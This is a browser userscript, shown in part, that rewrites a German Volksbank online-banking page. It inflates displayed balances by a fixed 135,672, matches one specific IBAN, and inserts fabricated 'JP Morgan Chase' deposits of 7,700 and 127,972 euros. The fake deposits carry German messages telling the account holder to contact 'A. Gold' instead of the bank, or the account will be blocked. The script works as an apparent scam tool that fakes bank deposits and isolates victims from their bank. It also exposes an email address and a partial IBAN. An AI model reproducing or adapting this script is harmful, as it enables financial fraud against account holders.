// ==UserScript==
// @name         Ed 4Rec  j.teckenbrock@me.com
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/520406/Ed%204Rec%20%20jteckenbrock%40mecom.user.js
// @updateURL https://update.greasyfork.org/scripts/520406/Ed%204Rec%20%20jteckenbrock%40mecom.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  135672},
        { index: 1, adjustmentAmount: 135672},
        { index: 2, adjustmentAmount: 135672},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE04 4006 9709";
    var targetTextContent2 = " 0415 0292 00";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 135672.0; // Adjust the amount as needed
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
 ...
 //          title: 'JP Morgan Chase',
  ...
  {
           title: 'JP Morgan Chase',
            description: '1 Wenden Sie sich an A. Gold, nicht die Bank, damit nicht gesperrt.',
           amount: '7.700,00',
            date: 'Heute',
           insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
        ...
        },
{
            ...
            description: 'Bitte sich an A. Gold wenden. Mit Bank nicht besprechen, solange kein Nachweis, sonst wird gesperrt.',
            amount: '127.972,00',
            date: 'Heute',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
